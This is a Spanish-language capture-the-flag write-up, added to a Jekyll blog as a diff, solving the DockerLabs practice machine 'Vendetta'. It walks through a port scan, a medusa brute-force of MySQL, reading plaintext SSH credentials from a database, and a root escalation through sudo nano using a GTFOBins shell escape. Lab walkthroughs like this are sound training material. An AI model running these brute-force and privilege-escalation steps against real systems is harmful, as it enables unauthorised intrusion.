@@ -1,0 +1,85 @@
+---
+layout: post
+title: "Vendetta"
+date: 2024-11-29
+ 13:25:23
+category: dockerlabs
+vm: dockerlabsfacil
+---
+
+<table class="log">
+  <tr>
+    <td rowspan="5"><img src="/notas/public/img/dockerlabs/dockerlabs.png" width=260></td>
+    <td></td>
+  </tr>
+  <tr> <td><strong>Máquina:</strong> Vendetta </td> </tr>
+  <tr> <td><strong>SO:</strong> Linux</td> </tr>
+  <tr> <td><strong>Nivel:</strong> <span class="easy">Facil</span></td> </tr>
+  <tr> <td><strong><a href="https://dockerlabs.es" target="_blank"> DockerLabs</a></strong></td> </tr>
+</table>
+
+<br>
+
+**1\.** Descubriendo los puertos abiertos tenemos la 22, 80 y 3306.
+
+`sudo nmap -p- --open -T5 --min-rate=5000 -sCV -Pn -n 10.88.0.2`
+
+![img](/notas/public/img/dockerlabs/vendetta/nmap.png){:.margin}
+
+**2\.** Revisamos la web, observando cuidadosamente podemos ver la V en negrita lo que nos hace pensar en un potencial usuario ya que mas no tenemos.
+
+`http://172.17.0.2`
+
+![img](/notas/public/img/dockerlabs/vendetta/web.png){:.margin}
+
+**3\.** Hacemos fuerza bruta al mysql, para esto inverti el rockyou ya que tenia buen tiempo esperando; decidi invertirlo y quitar los caracteres no imprimibles; y ojo el usuario V en mayuscula.
+
+`tac /usr/share/wordlists/rockyou.txt | strings > wordlist`
+
+`medusa -h 172.17.0.2 -u V -P wordlist -M mysql -n 3306`
+
+![img](/notas/public/img/dockerlabs/vendetta/medusa.png){:.margin}
+
+_Me paso que estaba bloqueado el 172.17.0.1 para esto ingresamos al contenedor **docker exec -it container_id_or_name bash** y ejecutamos **mariadb-admin flush-hosts**; ademas con hydra me bloqueaba continuamente asi que use medusa_ 
+
+<br>
+
+**4\.** Nos conectamos a mysql; encontramos unas credenciales que suponemos que son para acceder por el ssh.
+
+`mysql -h 172.17.0.2 -u V -pie168`
+
+`show databases;`
+
+`use BTN;`
+
+`show tables;`
+
+`select * from users;`
+
+![img](/notas/public/img/dockerlabs/vendetta/mysql.png){:.margin}
+![img](/notas/public/img/dockerlabs/vendetta/mysql1.png){:.margin}
+
+**5\.** Accedemos por el ssh con estas credenciales.
+
+`sshpass -p "OldBailey" ssh Vendetta@172.17.0.2 -p 22`
+
+![img](/notas/public/img/dockerlabs/vendetta/ssh.png){:.margin}
+
+**6\.** Buscamos binarios SUID; encontramos uno y aprovechamos de este para escalar a root. Ojo [gtfobins](https://gtfobins.github.io/gtfobins/nano/#sudo).
+
+`sudo -l`
+
+`sudo /usr/bin/nano`
+
+`ctrl + r`
+
+`ctrl + x`
+
+`reset; bash 1>&0 2>&0`
+
+![img](/notas/public/img/dockerlabs/vendetta/sudol.png){:.margin}
+![img](/notas/public/img/dockerlabs/vendetta/root.png){:.margin}
+
+<br>
+
+<a href="#">_Finalizado._</a>
